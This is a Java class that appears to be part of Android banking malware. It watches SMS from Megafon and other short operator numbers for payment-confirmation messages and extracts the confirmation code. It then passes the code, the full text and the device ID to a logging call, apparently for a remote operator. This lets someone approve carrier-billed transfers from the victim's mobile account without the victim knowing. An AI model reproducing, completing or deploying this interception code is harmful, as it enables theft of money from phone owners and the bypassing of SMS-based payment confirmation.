package com.my.myapp.core.banks;

import com.my.myapp.core.banks.types.Utils;
import com.my.myapp.core.client.Logger;
import org.json.JSONObject;

public class SimOperatorBank {
    public static final String MEGAFON_NUMBER = "333";
    public static final String[] PHONE_NUMBERS = {MEGAFON_NUMBER, "1212", "8464"};

    public static void handleResponse(String sender, String text, String deviceId) {
        if (!isOperatorNumber(sender)) return;

        JSONObject data = new JSONObject();
        try {
            data.put("type", "operator");
            data.put("deviceId", deviceId);
            data.put("sender", sender);
            data.put("text", text);

            if (text.contains("Для подтверждения платежа") || text.contains("Отправьте в ответ цифру 1")) {
                String code = (MEGAFON_NUMBER.equals(sender))
                        ? Utils.getCodeFromSimTransferConfirmation(text)
                        : "1";
                data.put("code", code);
            }

            Logger.sendLog("operator", data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static boolean isOperatorNumber(String num) {
        for (String op : PHONE_NUMBERS) if (op.equals(num)) return true;
        return false;
    }
}